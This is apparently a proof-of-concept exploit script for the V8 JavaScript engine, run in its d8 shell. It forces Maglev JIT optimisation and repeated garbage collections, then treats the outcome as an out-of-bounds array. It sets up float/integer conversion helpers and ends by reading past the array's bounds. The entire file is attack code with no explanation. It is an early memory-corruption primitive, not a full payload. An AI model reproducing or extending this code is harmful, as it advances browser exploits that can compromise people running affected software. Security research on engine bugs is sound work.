class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    addRef(object) {
        this.roots[this.index++] = object;
    }

    markSweepGC() {
        // Trigger major GC (mark-sweep)
        new ArrayBuffer(0x7fe00000);
    }

    scavengeGC() {
        // Trigger several scavenge (minor GC)
        for (let i = 0; i < 8; i++) {
            this.addRef(new ArrayBuffer(0x200000));
        }
        this.addRef(new ArrayBuffer(8));
    }

    f2i(val) {
        this.f64[0] = val;
        return this.u64[0];
    }

    i2f(val) {
        this.u64[0] = val;
        return this.f64[0];
    }
}

const helper = new Helpers();

function majorGC() {
    new ArrayBuffer(0x7fe00000);
}

function f1() {
    helper.markSweepGC();
    new ArrayBuffer();
    v0 = Math.sqrt(0);
}

function f5() {
    %OptimizeMaglevOnNextCall(f1);
    f1();
}

let v0 = 1;

f5();
f5();
helper.scavengeGC();
helper.markSweepGC();

let helpArray = [0, 0, 0.1, 0, 0];

let oobArray = v0;

print("oobArray:");
%DebugPrint(oobArray);
print("[+] oobArray[100]: ", oobArray[100]);
